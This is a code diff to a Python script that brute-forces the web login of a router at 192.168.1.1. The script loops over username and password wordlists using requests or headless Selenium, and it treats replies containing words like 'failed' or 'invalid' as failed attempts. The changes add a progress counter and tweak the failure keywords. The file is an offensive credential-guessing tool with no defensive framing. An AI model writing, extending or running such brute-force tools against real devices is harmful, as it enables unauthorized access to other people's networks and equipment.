@@ -1,3 +1,5 @@
+# chmod +x /PATH-TO/selenium/webdriver/common/linux/selenium-manager
+
 import requests
 import sys
 from requests_html import HTMLSession
@@ -7,12 +9,12 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-URL = "http://192.168.1.1"
-EXPRESSIONS = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}
+URL = "http://192.168.1.1" # Be sure about the router ip
+EXPRESSIONS = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser", b"fail"}
 
 def brute_with_selenium(username, password):
     options = Options()
-    options.headless = True
+    options.headless = True  
     driver = webdriver.Firefox(options=options)
 
     try:
@@ -61,12 +63,13 @@ def main():
 
     usernames = [u.strip() for u in open("username.txt", "r").readlines()]
     passwords = [p.strip() for p in open("password.txt", "r").readlines()]
+    total_combinations = len(usernames) * len(passwords)
 
     try:
         for username in usernames:
             for password in passwords:
                 combinations_tested += 1
-                sys.stdout.write("\rCombinations tested: %d" % combinations_tested)
+                sys.stdout.write("\rCombinations tested: %d/%d" % (combinations_tested, total_combinations))
                 sys.stdout.flush()
 
                 if use_selenium or any(brute(username, password) for item in EXPRESSIONS):
